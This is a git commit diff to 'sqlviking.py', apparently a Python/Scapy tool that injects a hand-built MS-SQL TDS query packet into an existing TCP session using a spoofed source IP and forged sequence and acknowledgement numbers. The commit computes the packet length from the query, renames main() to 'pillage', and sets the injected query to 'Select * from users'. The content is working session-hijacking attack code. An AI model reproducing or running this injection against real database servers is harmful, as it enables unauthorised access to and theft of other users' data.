a431ace9705230abd4cd49746522918c213c9e28
Atticuss <jonn.callahan@gmail.com>
2014-10-22 06:40:11 -0700

    length dynamically calculated via query length

--- sqlviking.py
+++ sqlviking.py
@@ -12,7 +12,6 @@ acknum=1177937577
 class TDSPacket:
 	type="01"
 	status="09"
-	length="007e" #derived from length of query: 30+len(query)*2
 	channel="0000"
 	pktnum="01"
 	window="00"
@@ -22,18 +21,17 @@ class TDSPacket:
 	typevalue="0000000000000000"
 	outstandingreqs="01000000"
 	query=""
-	data=""
 
 	def __init__(self,query):
 		for x in query:
 			self.query+=x.encode("hex")+"00"
-		#self.length=str((len(query)*2+30)).encode("hex")
+		self.length='{:0>4}'.format(hex(len(query)*2+30)[2:])
 		self.data=self.type+self.status+self.length+self.channel+self.pktnum+self.window+self.totalhlength+self.hlength+self.htype+self.typevalue+self.outstandingreqs+self.query	
 
-def main():
+def pillage():
 	global dstip,srcip,dstport,srcport,seqnum,acknum
-	tdsdata=TDSPacket("Select * from users where username = 'swarmuser'")
+	tdsdata=TDSPacket("Select * from users")
 	send(IP(dst=dstip,src=srcip)/TCP(flags="PA",dport=dstport,sport=srcport,seq=seqnum,ack=acknum)/tdsdata.data.decode("hex"))
 
 if __name__ == "__main__":
-	main()
+	pillage()
